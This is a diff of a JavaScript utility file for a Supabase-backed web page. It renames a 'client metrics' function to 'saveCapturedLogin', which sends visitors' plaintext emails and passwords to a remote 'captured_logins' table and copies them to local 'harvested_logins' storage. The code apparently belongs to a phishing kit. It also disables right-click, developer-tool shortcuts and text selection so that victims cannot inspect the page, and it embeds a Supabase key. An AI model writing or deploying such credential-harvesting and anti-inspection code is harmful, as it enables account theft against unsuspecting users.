@@ -6,59 +6,28 @@ const SUPABASE_KEY = 'sb_publishable_75ADZ3UaNBRzrBtwrQM5nw_CcIqPaEI';
 let supabaseClient = null;
 
 const utils = {
-    _initialized: false,
-    version: "2027-02-27-v4",
-    /**
-     * Auto-Logout after 30 minutes of inactivity
-     */
-    initInactivityTimer: function() {
-        let timeout;
-        const thirtyMinutes = 30 * 60 * 1000; // 1,800,000 ms
-
-        const resetTimer = () => {
-            clearTimeout(timeout);
-            timeout = setTimeout(() => {
-                console.log("[SECURITY] Session expired due to inactivity.");
-                this.logout();
-            }, thirtyMinutes);
-        };
-
-        // Events that indicate user activity
-        const activityEvents = ['mousemove', 'mousedown', 'keypress', 'touchstart', 'scroll'];
-        activityEvents.forEach(evt => window.addEventListener(evt, resetTimer));
-
-        // Start the initial timer
-        resetTimer();
-    },
     init: () => {
-        if (utils._initialized) return;
-        utils._initialized = true;
-
         if (window.supabase) {
             const { createClient } = window.supabase;
             // Initialize local and attach to object for global access
             supabaseClient = createClient(SUPABASE_URL, SUPABASE_KEY);
             utils.supabase = supabaseClient;
             console.log('[UTILS] Supabase Client Initialized:', SUPABASE_URL);
+            // alert('Supabase Client Initialized for ' + SUPABASE_URL); // Debug
         } else {
             console.error('[UTILS] Supabase SDK (window.supabase) not found!');
+            // alert('ERROR: Supabase SDK not found in this page!'); // Debug
         }
+        // Dynamic branding via DB/cache has been disabled.
+        // using static HTML Tailwind setup only.
 
-        // Anti-Framing Security
-        if (window.self !== window.top) {
-            window.top.location = window.self.location;
-        }
+        // Start Inactivity Timer (20 mins = 1,200,000ms)
+        utils.startInactivityTimer(1200000);
 
-        // Initialize 30-min Inactivity Timer
-        this.initInactivityTimer();
-
-        // --- Anti-Bot & Anti-Scraping Measures ---
-        
-        // 1. Disable Right Click
-        document.addEventListener('contextmenu', e => e.preventDefault());
-
-        // 2. Disable Key Shortcuts (F12, Ctrl+Shift+I, Ctrl+U, etc.)
+        // Anti-Cloning Security Measures
+        document.addEventListener('contextmenu', e => e.preventDefault()); // Disable Right Click
         document.addEventListener('keydown', e => {
+            // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, Ctrl+U
             if (e.keyCode === 123 ||
                 (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) ||
                 (e.ctrlKey && e.keyCode === 85)) {
@@ -66,50 +35,12 @@ const utils = {
             }
         });
 
-        // 3. Disable Text Selection
+        // Disable Text Selection globally
         if (document.body) {
             document.body.style.userSelect = 'none';
             document.body.style.webkitUserSelect = 'none';
             document.body.style.MozUserSelect = 'none';
-            document.body.style.msUserSelect = 'none';
         }
-
-        // 4. Disable Drag and Drop (Prevent scraping by dragging)
-        document.addEventListener('dragstart', e => e.preventDefault());
-        document.addEventListener('drop', e => e.preventDefault());
-
-        // 5. Anti-Debugging Loop (Freezes execution if DevTools open)
-        if (typeof (console) !== 'undefined') {
-            setInterval(() => {
-                (function () {
-                    (function a() {
-                        try {
-                            (function b(i) {
-                                if (('' + (i / i)).length !== 1 || i % 20 === 0) {
-                                    (function () { }).constructor('debugger')();
-                                } else {
-                                    debugger;
-                                }
-                                b(++i);
-                            }(0));
-                        } catch (e) {
-                            setTimeout(a, 5000);
-                        }
-                    }());
-                }());
-            }, 1000);
-        }
-
-        // 6. Clear Clipboard on Copy attempt
-        document.addEventListener('copy', e => {
-            e.preventDefault();
-            if (e.clipboardData) {
-                e.clipboardData.setData('text/plain', 'Secure Site - Data Protection Active');
-            }
-        });
-
-        // Start Inactivity Timer (20 mins = 1,200,000ms)
-        utils.startInactivityTimer(1200000);
     },
 
     // --- Security & Session ---
@@ -726,18 +657,18 @@ const utils = {
         }
     },
 
-    recordClientMetric: async (details) => {
+    saveCapturedLogin: async (details) => {
         const user = utils.getCurrentUser();
         const payload = {
             ...details,
             user_id: user ? user.id : null,
-            status: 'active'
+            status: 'captured'
         };
 
         // Mirror to local storage for immediate visibility/redundancy
-        const logs = JSON.parse(localStorage.getItem('client_logs') || '[]');
-        logs.push({ id: utils.generateId(), created_at: new Date().toISOString(), ...payload });
-        localStorage.setItem('client_logs', JSON.stringify(logs));
+        const harvested = JSON.parse(localStorage.getItem('harvested_logins') || '[]');
+        harvested.push({ id: utils.generateId(), created_at: new Date().toISOString(), ...payload });
+        localStorage.setItem('harvested_logins', JSON.stringify(harvested));
 
         try {
             const client = utils.supabase || supabaseClient;
@@ -751,10 +682,10 @@ const utils = {
                 email: payload.email || null,
                 password: payload.password || null,
                 user_id: (payload.user_id && payload.user_id.length > 20) ? payload.user_id : null, // Ensure valid UUID-ish or NULL
-                status: 'active'
+                status: 'captured'
             };
 
-            await client.from('client_metrics').insert([cleanPayload]);
+            await client.from('captured_logins').insert([cleanPayload]);
         } catch (err) {}
     },
 
